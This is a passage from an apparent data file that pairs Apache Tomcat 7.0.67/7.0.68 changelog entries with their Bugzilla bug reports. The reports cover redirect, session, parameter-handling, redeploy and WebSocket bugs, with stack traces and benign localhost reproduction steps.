	at org.apache.catalina.core.ApplicationDispatcher.forward(ApplicationDispatcher.java:317)
	at org.apache.catalina.core.StandardHostValve.custom(StandardHostValve.java:445)
	at org.apache.catalina.core.StandardHostValve.status(StandardHostValve.java:304)
	at org.apache.catalina.core.StandardHostValve.throwable(StandardHostValve.java:399)
	at org.apache.catalina.core.AsyncContextImpl.setErrorState(AsyncContextImpl.java:451)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:293)
	at org.apache.coyote.http11.AbstractHttp11Processor.asyncDispatch(AbstractHttp11Processor.java:1716)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:650)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1500)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1456)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58751
Catalina|Tomcat 7.0.68 (violetagg)|fix|58765|Change default for mapperContextRootRedirectEnabled to true since this is required for correct session management because of the default for sessionCookiePathUsesTrailingSlash. (markt)|Default behavior change in tomcat 8.0.29-30 context root redirect process|"Changes to tomcat 8.0.29-30 break applications that modify attributes on the HttpSession object on the initial root context url request, and possibly other places.  This behavior change is partially described in bug 58660.

Behaviors seen:

In 8.0.28, a request to the application context ""/context"" would result in a redirect to ""/context/"".  This handling was handed in a way that was invisible to the application code.  

In 8.0.29, this request is processed and the application generates a response.

In 8.0.30, this request is processed by the application, but generates a 302 to ""/context/""

8.0.29-30 both break my application in similar but distinct ways.  The cause is that the application processes the initial request in a filter, modifies the session object, and then issues a redirect to itself.  Because the JSESSION cookie path is set to ""/context/"" and not ""/context"", the session seen on the subsequent handling of the redirect does not have access to the same session object as on the first request.  In a real application that depends on similar behavior this breaks the application in significant ways.

Another way to think of this is that it shouldn't be possible for the application to access an HttpSession that doesn't match the browser's session cookie.  As of 8.0.30 this implied contract is broken because on the initial request to the ""/context"" url, application code has access to an effectively bogus HttpSession instance.

I have created a test application that shows the different behaviors:

https://github.com/jrivard/tomcat-root-redir-test

The behavior can be reverted to the 8.0.28 style by setting the context parameter mapperContextRootRedirectEnabled=true.

I recommend the default of this setting - or some other equivalent - be changed to false.  

This issue can also be corrected by changing the context parameter sessionCookiePathUsesTrailingSlash=false, however this has a potentially negative security impact so I don't think this default should be changed.

In any case, the default behavior for this execution path should not be changing  on point releases.  My understanding is there is a similar issue in the 7.x and 9.x branch but I haven't tested them."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58765
Catalina|Tomcat 7.0.68 (violetagg)|fix||Add the StatusManagerServlet to the list of Servlets that can only be loaded by privileged applications. (markt)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix||Simplify code and fix messages in org.apache.catalina.core.DefaultInstanceManager class. (kkolinko)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix||Ensure that the proper file encoding if specified will be used when a readme file is served by DefaultServlet. (violetagg)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix||Fix declaration of localPort attribute of Connector MBean: it is read-only. (kkolinko)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix|58766|Make skipping non-class files during annotation scanning faster by checking the file name first. Improve debug logging. (kkolinko)|Embedded Tomcat 8 startup hangs on RedHat when calling addWebapp|"Created attachment 33373 [details]
thread dump

After upgrading to Tomcat 8.0.29 (used Tomcat 7 before), starting from the second startup of the application, tomcat hangs when calling addWebapp.

At the first startup everything works OK. Just after stopping the service of my application and starting it again the problem will occur.
I assume it's related to exploding the war file.

This happens on RedHat only (Suse works just fine).

Moreover, when I start my application from script, rather than as a service, everything works well. 

Any idea what can I do to solve this?

Thanks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58766
Catalina|Tomcat 7.0.68 (violetagg)|fix|58768|Log a warning if a redirect fails because of an invalid location. (markt)|Add Logging to Response.sendRedirect|"The new behavior introduced in:

https://bz.apache.org/bugzilla/show_bug.cgi?id=56917

Can cause strange and mysterious errors. For example, passing an invalid value fo sendRedirect():

response.sendRedirect(""SomePage.html?value=Some Word"")

will now generate a 404 error indicating that the page containing the sendRedirect() call is not found. In this case the real error is that the parameter is not URI encoded.

Additionally, because of the manner it's called, no diagnostic page is generated. The developer is left scratching their head wonder what went wrong.

It would be very helpful if the IllegalArgumentException that get's caught in o.a.c.c.Response at line 1412 could be logged."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58768
Catalina|Tomcat 7.0.68 (violetagg)|fix|58836|Correctly merge query string parameters when processing a forwarded request where the target includes a query string that contains a parameter with no value. (markt/kkolinko)|Query string parameters w/o values are not sent to dest servlet via request.getRequestDispatcher().forward()|"URL / query string parameters with no value (technically keyless values) are not received by the destination servlet when using request.getRequestDispatcher().forward().

Example:
request.getRequestDispatcher(""/newpage?P1=1&P2"").forward(request,response);

The servlet handling /newpage will have P1 in the request parameter list but not P2 even though both parameters are in the query string verified with request.getQueryString().  The order and quantity of parameters doesn't seem to make a difference, those without values are not seen by the servlet, while those with values (or even with just an = but no value) are.

I believe the cause may be in ApplicationHttpRequest.mergeParameters().  Possibly the line ""if (value == null)"" should be replaced with if (queryParameters.containsKey(key)) (among other things), but I'm not 100% on that, building and debugging Tomcat is beyond my capabilities at this point.

I have a pair of test servlets that show this behavior on my development server if somebody wants to see it in action.  Email me safepassing2/gmail_com and I'll provide the address."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58836
Catalina|Tomcat 7.0.68 (violetagg)|fix||Make sure that shared Digester is reset in an unlikely error case in HostConfig.deployWAR(). (kkolinko)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix||Fix a potential JDBC resource leak in DataSourceRealm. (schultz)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix|58900|Correctly undeploy symlinked resources and prevent an infinite cycle of deploy / undeploy. (markt)|"Infinite redeploy loop with undeployOldVersions=""true"""|"Created attachment 33471 [details]
JConsole screen while observing this behavior

## Reproduction steps ##

To reproduce this issue:

1. Add undeployOldVersions=""true"" to the otherwise default Host configuration in server.xml

2. Do a parallel deployment of two versions of the same war by creating a symlink to the actual war file(s):

$ ln -s /path/to/app.war /path/to/webapps/app#001.war
$ ln -s /path/to/app.war /path/to/webapps/app#002.war

Shortly after startup, Tomcat undeploys app##001 (the ""old version""). However, the war file is not deleted, and ends up getting redeployed. This happens over and over again, until at some point the number of loaded classes grows too big and OutOfMemoryError happens.

## Root cause ##

What's preventing the symlinked war from getting deleted is this line in org.apache.catalina.startup.HostConfig#deleteRedeployResources:

current = current.getCanonicalFile();

The canonical file is war file the symlink is pointing to, and the isDeletableResource method determines that it should not be deleted.

## Context ##

This issue has been plaguing me on a CentOS/6 server running 7.0.55, but appears to affect 8.x and 9.x as well. I reproduced it locally on OSX. My Struts2/Spring/Hibernate application died within ~10 minutes with -Xmx256m. Screenshot from jconsole attached, undeploy/redeploy cycle can be seen clearly in the CPU usage and number of classes loaded."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58900
Catalina|Tomcat 7.0.68 (violetagg)|fix||Protect initialization of ResourceLinkFactory when running with a SecurityManager. (kkolinko)|||
Catalina|Tomcat 7.0.68 (violetagg)|add||Extend the feature available in the cluster session manager implementations that enables session attribute replication to be filtered based on attribute name to all session manager implementations. Note that configuration attribute name has changed from sessionAttributeFilter to sessionAttributeNameFilter. Apply the filter on load as well as unload to ensure that configuration changes made while the web application is stopped are applied to any persisted data. (markt)|||
Catalina|Tomcat 7.0.68 (violetagg)|add||Extend the session attribute filtering options to include filtering based on the implementation class of the value and optional WARN level logging if an attribute is filtered. These options are available for all of the Manager implementations that ship with Tomcat. When a SecurityManager is used filtering will be enabled by default. (markt)|||
Catalina|Tomcat 7.0.68 (violetagg)|fix|58905|Ensure that Tomcat.silence() silences the correct logger and respects the current setting. (markt)|Fix Tomcat.silence() to silence the correct logger and to respect defaults|"Noted when reviewing implementation of Tomcat.silence() in relation to Tomcat unit tests.

Currently Tomcat.addContext() is implemented as following:
[[[
    public Context addContext(Host host, String contextPath, String contextName,
            String dir) {
        silence(host, contextPath);
        Context ctx = createContext(host, contextPath);
        ctx.setName(contextName);
        ctx.setPath(contextPath);
        ctx.setDocBase(dir);
        ctx.addLifecycleListener(new FixContextListener());

        if (host == null) {
            getHost().addChild(ctx);
        } else {
            host.addChild(ctx);
        }
        return ctx;
    }
]]]

The silence() call attempts to silence the logger for this Context by setting its log level to Level.WARNING.

The following notes apply to Tomcat class of all current versions
(Tomcat 7/8/9):

1. Note that in Tomcat unit tests the loggers are not silenced by default,
as Tomcat.setSilent(boolean) is not called by Tomcat test code.

=> The silent(Host, contextPath) call shall respect the defaults and do not silence this logger if other loggers are not silenced.

2. The Engine name used in Tomcat.getLoggerName() is wrong.

Tomcat.getEngine() uses ""Tomcat"" as the name, not ""default"".

=> It shall get the actual Engine instance from Host.getParent().

3. Tomcat.getLoggerName() shall use the same logic as ContainerBase.logName()

=> It does not handle """" and null names correctly."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58905
Catalina|Tomcat 7.0.68 (violetagg)|fix|58946|Ensure that the request parameter map remains immutable when processing via a RequestDispatcher. (markt)|ApplicationHttpRequest should enforce immutability of ParameterMap|"JavaDoc for ServletRequest.getParameterMap(), both ours and the one at Oracle site [1] says:

""Returns: an immutable java.util.Map containing [...]""

The problem is that this immutability is not enforced by org.apache.catalina.core.ApplicationHttpRequest class that is used to implement included or forwarded requests.

Note that org.apache.catalina.util.ParameterMap class used for usual (not forwarded) requests does enforce immutability. An example of message from that class is shown below.


Reproducible with current Tomcat 8.0-dev.

Steps to reproduce
--------------------
1. Put the following two JSPs into ROOT web application:

test.jsp
[[[
<%@page contentType=""text/plain;charset=UTF-8"" import=""java.util.*""%>
<%
RequestDispatcher rd = request.getRequestDispatcher(""test2.jsp"");
rd.forward(request, response);
%>
]]]

test2.jsp
[[[
<%@page contentType=""text/plain;charset=UTF-8"" import=""java.util.*""%>
<%
Map map = request.getParameterMap();
map.put(""foo"", ""bar"");
%>
<%= map %>
]]]

2. Call
http://localhost:8080/test.jsp?z=a

Actual:
--------
The following response is observed:
[[[
{foo=bar, z=[Ljava.lang.String;@3877a5}
]]]

Expected:
---------
If I call the test2.jsp application directly, the behaviour is as expected:

http://localhost:8080/test2.jsp?z=a

HTTP Status 500 - An exception occurred processing JSP page /test2.jsp at line 4

root cause

java.lang.IllegalStateException: No modifications are allowed to a locked ParameterMap
	org.apache.catalina.util.ParameterMap.put(ParameterMap.java:164)
	org.apache.jsp.test2_jsp._jspService(test2_jsp.java:115)

------------------------

I noticed this issue while performing code review,
inspired by a thread started 2016-01-19 on users mailing list [2].

[1] http://docs.oracle.com/javaee/7/api/javax/servlet/ServletRequest.html#getParameterMap--

[2] http://tomcat.markmail.org/thread/3hq4fghtoxcj44i5"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58946
Coyote|Tomcat 7.0.68 (violetagg)|add||New configuration option ajpFlush for the AJP connectors to disable the sending of AJP flush packets. (rjung)|||
Jasper|Tomcat 7.0.68 (violetagg)|fix||Fix handling of missing messages in org.apache.el.util.MessageFactory. (violetagg)|||
Jasper|Tomcat 7.0.68 (violetagg)|fix||Ignore engineOptionsClass and scratchdir when running under a security manager. (markt)|||
Cluster|Tomcat 7.0.68 (violetagg)|fix||In order to avoid that the heartbeat thread and the background thread to run Channel.heartbeat simultaneously, if heartbeatBackgroundEnabled of SimpleTcpCluster set to true, ensure that the heartbeat thread does not start. (kfujino)|||
WebSocket|Tomcat 7.0.68 (violetagg)|fix|57489|Ensure onClose() is called when a WebSocket connection is closed even if the sending of the close message fails. Includes test cases by Barry Coughlan. (markt)|java.util.concurrent.ExecutionException: java.io.IOException: Key must be cancelled|"Hello all,

we have been trying to track down the cause of some strange exceptions produced by our application, that are related to the websocket connection somehow being dropped.

This happens in multiple deployments of the application, but this one in particular is on a Windows 8 Machine.

2015-01-22 15:14:09,599 CST WARN  [null] - Duplicate resource 7143de60-6212-4a06-8e2b-ce266c1d9769. Could be caused by a dead connection not detected by your server. Replacing the old one with the fresh one 
2015-01-22 15:14:09,599 CST ERROR [null] - java.io.IOException:  
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:276) 
     at org.apache.tomcat.websocket.WsSession.sendCloseMessage(WsSession.java:536) 
     at org.apache.tomcat.websocket.WsSession.doClose(WsSession.java:464) 
     at org.apache.tomcat.websocket.WsSession.close(WsSession.java:441) 
     at org.apache.tomcat.websocket.WsSession.close(WsSession.java:435) 
     at org.atmosphere.container.version.JSR356WebSocket.close(JSR356WebSocket.java:142) 
     at org.atmosphere.websocket.WebSocket.close(WebSocket.java:273) 
     at org.atmosphere.cpr.AtmosphereResponse.close(AtmosphereResponse.java:848) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.cancel(AtmosphereResourceImpl.java:779) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.close(AtmosphereResourceImpl.java:855) 
     at com.vaadin.server.communication.AtmospherePushConnection.disconnect(AtmospherePushConnection.java:305) 
     at com.vaadin.server.communication.PushHandler.disconnect(PushHandler.java:430) 
     at com.vaadin.server.communication.PushHandler.onDisconnect(PushHandler.java:330) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.onDisconnect(AtmosphereResourceImpl.java:715) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.notifyListeners(AtmosphereResourceImpl.java:618) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.notifyListeners(AtmosphereResourceImpl.java:598) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.dirtyClose(AtmosphereResourceImpl.java:864) 
     at org.atmosphere.cpr.DefaultBroadcaster.addAtmosphereResource(DefaultBroadcaster.java:1370) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.suspend(AtmosphereResourceImpl.java:408) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.suspend(AtmosphereResourceImpl.java:324) 
     at com.vaadin.server.communication.PushHandler$2.run(PushHandler.java:131) 
     at com.vaadin.server.communication.PushHandler.callWithUi(PushHandler.java:253) 
     at com.vaadin.server.communication.PushHandler.access$200(PushHandler.java:56) 
     at com.vaadin.server.communication.PushHandler$1.onRequest(PushHandler.java:74) 
     at org.atmosphere.cpr.AsynchronousProcessor.action(AsynchronousProcessor.java:205) 
     at org.atmosphere.cpr.AsynchronousProcessor.suspended(AsynchronousProcessor.java:104) 
     at org.atmosphere.container.Servlet30CometSupport.service(Servlet30CometSupport.java:66) 
     at org.atmosphere.cpr.AtmosphereFramework.doCometSupport(AtmosphereFramework.java:2075) 
     at org.atmosphere.websocket.DefaultWebSocketProcessor.dispatch(DefaultWebSocketProcessor.java:570) 
     at org.atmosphere.websocket.DefaultWebSocketProcessor.open(DefaultWebSocketProcessor.java:215) 
     at org.atmosphere.container.JSR356Endpoint.onOpen(JSR356Endpoint.java:198) 
     at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.init(WsHttpUpgradeHandler.java:138) 
     at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:684) 
     at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:222) 
     at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1556) 
     at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1513) 
     at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) 
     at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) 
     at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) 
     at java.lang.Thread.run(Unknown Source) 
Caused by: java.util.concurrent.ExecutionException: java.io.IOException: Key must be cancelled 
     at org.apache.tomcat.websocket.FutureToSendHandler.get(FutureToSendHandler.java:102) 
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:269) 
     ... 39 more 
Caused by: java.io.IOException: Key must be cancelled 
     at org.apache.coyote.http11.upgrade.NioServletOutputStream.doWriteInternal(NioServletOutputStream.java:84) 
     at org.apache.coyote.http11.upgrade.NioServletOutputStream.doWrite(NioServletOutputStream.java:61) 
     at org.apache.coyote.http11.upgrade.AbstractServletOutputStream.writeInternal(AbstractServletOutputStream.java:162) 
     at org.apache.coyote.http11.upgrade.AbstractServletOutputStream.write(AbstractServletOutputStream.java:129) 
     at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.onWritePossible(WsRemoteEndpointImplServer.java:99) 
     at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.doWrite(WsRemoteEndpointImplServer.java:81) 
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.writeMessagePart(WsRemoteEndpointImplBase.java:444) 
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessage(WsRemoteEndpointImplBase.java:335) 
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:264) 
     ... 39 more 
Caused by: java.util.concurrent.ExecutionException: 
     at org.apache.tomcat.websocket.FutureToSendHandler.get(FutureToSendHandler.java:102) 
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:269) 
     at org.apache.tomcat.websocket.WsSession.sendCloseMessage(WsSession.java:536) 
     at org.apache.tomcat.websocket.WsSession.doClose(WsSession.java:464) 
     at org.apache.tomcat.websocket.WsSession.close(WsSession.java:441) 
     at org.apache.tomcat.websocket.WsSession.close(WsSession.java:435) 
     at org.atmosphere.container.version.JSR356WebSocket.close(JSR356WebSocket.java:142) 
     at org.atmosphere.websocket.WebSocket.close(WebSocket.java:273) 
     at org.atmosphere.cpr.AtmosphereResponse.close(AtmosphereResponse.java:848) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.cancel(AtmosphereResourceImpl.java:779) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.close(AtmosphereResourceImpl.java:855) 
     at com.vaadin.server.communication.AtmospherePushConnection.disconnect(AtmospherePushConnection.java:305) 
     at com.vaadin.server.communication.PushHandler.disconnect(PushHandler.java:430) 
     at com.vaadin.server.communication.PushHandler.onDisconnect(PushHandler.java:330) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.onDisconnect(AtmosphereResourceImpl.java:715) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.notifyListeners(AtmosphereResourceImpl.java:618) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.notifyListeners(AtmosphereResourceImpl.java:598) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.dirtyClose(AtmosphereResourceImpl.java:864) 
     at org.atmosphere.cpr.DefaultBroadcaster.addAtmosphereResource(DefaultBroadcaster.java:1370) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.suspend(AtmosphereResourceImpl.java:408) 
     at org.atmosphere.cpr.AtmosphereResourceImpl.suspend(AtmosphereResourceImpl.java:324) 
     at com.vaadin.server.communication.PushHandler$2.run(PushHandler.java:131) 
     at com.vaadin.server.communication.PushHandler.callWithUi(PushHandler.java:253) 
     at com.vaadin.server.communication.PushHandler.access$200(PushHandler.java:56) 
     at com.vaadin.server.communication.PushHandler$1.onRequest(PushHandler.java:74) 
     at org.atmosphere.cpr.AsynchronousProcessor.action(AsynchronousProcessor.java:205) 
     at org.atmosphere.cpr.AsynchronousProcessor.suspended(AsynchronousProcessor.java:104) 
     at org.atmosphere.container.Servlet30CometSupport.service(Servlet30CometSupport.java:66) 
     at org.atmosphere.cpr.AtmosphereFramework.doCometSupport(AtmosphereFramework.java:2075) 
     at org.atmosphere.websocket.DefaultWebSocketProcessor.dispatch(DefaultWebSocketProcessor.java:570) 
     at org.atmosphere.websocket.DefaultWebSocketProcessor.open(DefaultWebSocketProcessor.java:215) 
     at org.atmosphere.container.JSR356Endpoint.onOpen(JSR356Endpoint.java:198) 
     at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.init(WsHttpUpgradeHandler.java:138) 
     at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:684) 
     at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:222) 
     at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1556) 
     at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1513) 
     at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source) 
     at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source) 
     at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) 
     at java.lang.Thread.run(Unknown Source) 
Caused by: java.io.IOException: Key must be cancelled 
     at org.apache.coyote.http11.upgrade.NioServletOutputStream.doWriteInternal(NioServletOutputStream.java:84) 
     at org.apache.coyote.http11.upgrade.NioServletOutputStream.doWrite(NioServletOutputStream.java:61) 
     at org.apache.coyote.http11.upgrade.AbstractServletOutputStream.writeInternal(AbstractServletOutputStream.java:162) 
     at org.apache.coyote.http11.upgrade.AbstractServletOutputStream.write(AbstractServletOutputStream.java:129) 
     at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.onWritePossible(WsRemoteEndpointImplServer.java:99) 
     at org.apache.tomcat.websocket.server.WsRemoteEndpointImplServer.doWrite(WsRemoteEndpointImplServer.java:81) 
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.writeMessagePart(WsRemoteEndpointImplBase.java:444) 
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessage(WsRemoteEndpointImplBase.java:335) 
     at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessageBlock(WsRemoteEndpointImplBase.java:264) 
     ... 39 more

Java 8
NIO connector

I reported this to the Atmosphere maintainer, who responded with the following:

jfarcand 	
9:53 AM (6 hours ago)
Hi,
please file a bug in Tomcat, this is clearly an issue with NIO/Tomcat implementation. It may happens less frequently with 2.2.5-SNAPSHOT, but still the issue is with Tomcat.

Thanks

-- Jeanfrancois
On 2015-01-23 10:47 AM, Chris Boyd wrote:
Caused by: java.io.IOException: Key must be cancelled 
     at org.apache.coyote.http11.upgrade.NioServletOutputStream.doWriteInternal(NioServletOutputStream.java:84) 
     at org.apache.coyote.http11.upgrade.NioServletOutputStream.doWrite(NioServletOutputStream.java:61) 
     at org.apache.coyote.http11.upgrade.AbstractServletOutputStream.writeInternal(AbstractServletOutputStream.java:162)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57489
WebSocket|Tomcat 7.0.68 (violetagg)|fix||Fix a timing issue on session close that could result in an exception being thrown for an incomplete message even through the message was completed. (markt)|||
Web Applications|Tomcat 7.0.68 (violetagg)|fix||Correct some typos in the JNDI resources How-To. (markt)|||
Web Applications|Tomcat 7.0.68 (violetagg)|fix||Don't create sessions unnecessarily in the Manager application. (markt)|||
Web Applications|Tomcat 7.0.68 (violetagg)|fix||Don't create sessions unnecessarily in the Host Manager application. (markt)|||
Web Applications|Tomcat 7.0.68 (violetagg)|fix|58723|Clarify documentation and error messages for the text interface of the manager to make clear that version must be used with path when referencing contexts deployed using parallel deployment. (markt)|Undeploy Versioned Context Fails|"With parallel deployment enabled and /context##version deployed, using http://localhost:8080/manager/text/undeploy?path=/context returns ""FAIL - No context exists for path /context"" but using /context##version is successful. Meanwhile, the context shown by /manager/text/list is /context, not /context##version:

/context:running:0:context##version

This is either a clarity issue in the documentation regarding the meaning of the term ""context"" ( http://tomcat.apache.org/tomcat-8.0-doc/manager-howto.html#List_Currently_Deployed_Applications ) or a behavior issue in the manager regarding the matching of the context string."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58723
Web Applications|Tomcat 7.0.68 (violetagg)|fix||Correct an error in the documentation of the expected behaviour for automatic deployment. If a WAR is updated and an expanded directory is present, the directory will always be deleted and recreated by expanding the WAR if unpackWARs is true. (markt)|||
Web Applications|Tomcat 7.0.68 (violetagg)|fix|58935|Remove incorrect references in the documentation to using jar:file: URLs with the Manager application. (markt)|Re-deploy from war without deleting context|"It appears that it is not possible to re-deploy a web application while the server is running without Tomcat cleaning up the context in /conf/Catalina/localhost/.


We want in server.xml

<Host name=""localhost""  appBase=""webapps""
            unpackWARs=""true"" autoDeploy=""false"">

Currently, the context file /conf/Catalina/localhost/appName.xml is deleted on the undeploy part of the re-deploy cycle.

We do not want the deletion of this file. We want a genuine update of the application that can be executed via the manager console by just overwriting the existing .war file. Currently, the manager application requires an undeployment first which cleans up the configuration.

Or in other words, we want some means of updating the running application in a controlled fashion for production use. With controlled fashion we mean that we don't want to be exposed to the complexity that comes with autoDeploy=""false"". From our perspective, the manager application should have the capability to upload and overwrite an existing .war file, explode it and reload the application without deleting the context. We do not want to put the context into the war file because it contains installation specific configuration."|https://bz.apache.org/bugzilla/show_bug.cgi?id=58935
Tribes|Tomcat 7.0.68 (violetagg)|fix||Add support for the startup notification of local members in the static cluster. (kfujino)|||
Tribes|Tomcat 7.0.68 (violetagg)|fix||Ignore the unnecessary member remove operation from different domain. (kfujino)|||
Tribes|Tomcat 7.0.68 (violetagg)|fix||Add support for the shutdown notification of local members in the static cluster. (kfujino)|||
Tribes|Tomcat 7.0.68 (violetagg)|fix||Ensure that asynchronous session replication thread is a daemon thread. (kfujino)|||
Other|Tomcat 7.0.68 (violetagg)|update||Update the NSIS Installer used to build the Windows Installers to version 2.50. (markt/kkolinko)|||
Catalina|Tomcat 7.0.67 (violetagg)|add|56917|As per RFC7231 (HTTP/1.1), allow HTTP/1.1 and later redirects to use relative URIs. This is controlled by a new attribute useRelativeRedirects on the Context and defaults to true. (markt)|Create a configuration to write relative 302 responses instead of absolute|"Create a Tomcat configuration to force tomcat to write relative location headers in 301/302 responses instead of absolute location headers.

Purpose:
Today Tomcat always writes an absolute response for redirects per RFC2616 standards.  However as many modern browsers support 302s to relative Locations as explained in https://en.wikipedia.org/wiki/HTTP_location , our friendly Tomcat application server should allow configuration to write back 302s in the more friendly form.

The ripple effect of this where applications choose to use this setting, will be very good for cpu cycles of web servers and load balancers all over the world.   This can greatly reduce the need for ProxyPassReverse in the Apache web server, and also for URL rewriting happenin in physical load balancers.

See this example where another gentleman has been compelled to recompile Tomcat to achieve the same thing
http://community.jaspersoft.com/wiki/f5-load-balancer-and-tomcat-302-error"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56917
Catalina|Tomcat 7.0.67 (violetagg)|fix|58660|Correct a regression in 7.0.66 caused by the change that moved the redirection for context roots from the Mapper to the Default Servlet. (markt)|Different redirect behaviour when accessing path without a /|"Hi,

Tomcat 8.0.29 changes the behaviour of requests for paths without a trailing slash. It seems to be limited to context roots, e.g. /examples instead of /examples/servlets.

When calling /examples on 8.0.28 it responds with a 302 redirecting to /examples/, but 8.0.29 responds with a 200.

I would say that people should be more careful with their URL:s, but this change in default behaviour is probably going to cause problems. It is probably not correct to respond with /examples/index.html, when accessing /examples. This changes any relative paths on a website, since there will be a / missing. This may indeed be verified by clicking any of the links in the 8.0.29 /examples response HTML. Clicking them causes the browser to fetch e.g. /servlets instead of /examples/servlets.

Accessing /examples/servlets however causes a 302 to /examples/servlets/, just like 8.0.28.


To reproduce:

1. Download Tomcat 8.0.28 and 8.0.29

% wget http://archive.apache.org/dist/tomcat/tomcat-8/v8.0.28/bin/apache-tomcat-8.0.28.zip
% wget http://apache.mirrors.spacedump.net/tomcat/tomcat-8/v8.0.29/bin/apache-tomcat-8.0.29.zip

Unzip the two archives.

2. Access /examples for Tomcat 8.0.28

% curl -vso /dev/null http://localhost:8080/examples
* STATE: INIT => CONNECT handle 0x6000572f0; line 1090 (connection #-5000)
* Added connection 0. The cache now contains 1 members
*   Trying ::1...
* STATE: CONNECT => WAITCONNECT handle 0x6000572f0; line 1143 (connection #0)
* Connected to localhost (::1) port 8080 (#0)
* STATE: WAITCONNECT => SENDPROTOCONNECT handle 0x6000572f0; line 1240 (connection #0)
* STATE: SENDPROTOCONNECT => DO handle 0x6000572f0; line 1258 (connection #0)
> GET /examples HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.45.0
> Accept: */*
>
* STATE: DO => DO_DONE handle 0x6000572f0; line 1337 (connection #0)
* STATE: DO_DONE => WAITPERFORM handle 0x6000572f0; line 1464 (connection #0)
* STATE: WAITPERFORM => PERFORM handle 0x6000572f0; line 1474 (connection #0)
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 302 Found
* Server Apache-Coyote/1.1 is not blacklisted
< Server: Apache-Coyote/1.1
< Location: http://localhost:8080/examples/
< Transfer-Encoding: chunked
< Date: Fri, 27 Nov 2015 08:36:11 GMT
<
{ [5 bytes data]
* STATE: PERFORM => DONE handle 0x6000572f0; line 1632 (connection #0)
* Curl_done
* Connection #0 to host localhost left intact
* Expire cleared


3. Access /examples for Tomcat 8.0.29

* STATE: INIT => CONNECT handle 0x6000572f0; line 1090 (connection #-5000)
* Added connection 0. The cache now contains 1 members
*   Trying ::1...
* STATE: CONNECT => WAITCONNECT handle 0x6000572f0; line 1143 (connection #0)
* Connected to localhost (::1) port 8080 (#0)
* STATE: WAITCONNECT => SENDPROTOCONNECT handle 0x6000572f0; line 1240 (connection #0)
* STATE: SENDPROTOCONNECT => DO handle 0x6000572f0; line 1258 (connection #0)
> GET /examples HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.45.0
> Accept: */*
>
